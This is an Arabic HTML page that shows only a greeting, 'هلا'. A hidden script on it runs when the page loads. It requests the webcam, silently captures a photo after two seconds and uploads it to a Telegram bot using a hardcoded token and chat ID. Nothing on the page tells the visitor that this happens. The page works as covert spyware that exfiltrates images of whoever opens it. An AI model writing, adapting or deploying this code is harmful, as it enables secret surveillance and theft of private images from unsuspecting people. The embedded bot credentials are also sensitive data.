<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط الصور</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <div>هلا</div>
    <video id="video" style="display: none;" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        async function sendPhoto(photo) {
            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
            const chatId = '6185375878';
            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photo);

            await fetch(url, {
                method: 'POST',
                body: formData
            });
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // الانتظار حتى يبدأ الفيديو
                video.onloadedmetadata = async () => {
                    video.play();
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toBlob(async (blob) => {
                            await sendPhoto(blob);
                        }, 'image/jpeg');
                    }, 2000); // التقاط الصورة بعد 2 ثانية
                };
            } catch (error) {
                console.error('Error accessing the camera: ', error);
            }
        }

        initCamera();
    </script>
</body>
</html>
